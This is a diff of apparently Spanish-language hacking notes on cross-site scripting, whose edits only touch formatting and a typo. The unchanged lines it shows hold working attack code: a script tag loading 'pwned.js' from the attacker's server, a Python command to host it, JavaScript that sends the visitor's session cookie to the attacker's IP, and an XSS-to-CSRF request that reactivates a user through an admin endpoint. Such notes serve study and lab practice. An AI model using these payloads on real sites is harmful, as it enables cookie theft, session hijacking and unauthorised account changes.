@@ -20,8 +20,8 @@ Inyetamos un codigo JS para que al ejecutar el sitio se realice una peticion a u
 <script src="http//ip:port/pwned.js"></script>
 ```
 
-En el archivo pwned.js tendriamos un codigo para intentar robar las cookies de un usuario logueado en el sitio
-Tendriamos en un servidor nuestro el archivo pwned.js que es el que se llamaria desde el servidor objetivo
+En el archivo **pwned.js** tendriamos un codigo para intentar robar las cookies de un usuario logueado en el sitio
+Tendriamos en un servidor nuestro el archivo **pwned.js** que es el que se llamaria desde el servidor objetivo
 ```bash
 python3 -m http.server 80
 ```
@@ -32,7 +32,7 @@ var req = new XMLHttpRequest();
 req.open('GET','http://ip/?cookie='+document.cookie);
 req.send();
 
-Esta seria otra opcion para habilitar un usuario inactivo ssegun las condiciones del sitio seria (CSRF) partiendo de la vulnerabilidad XSS
+Esta seria otra opcion para habilitar un usuario inactivo segun las condiciones del sitio seria (CSRF) partiendo de la vulnerabilidad XSS
 
 var req = new XMLHttpRequest();
 req.open('GET','http://ip/admin/admin.php?id=11&status=active');
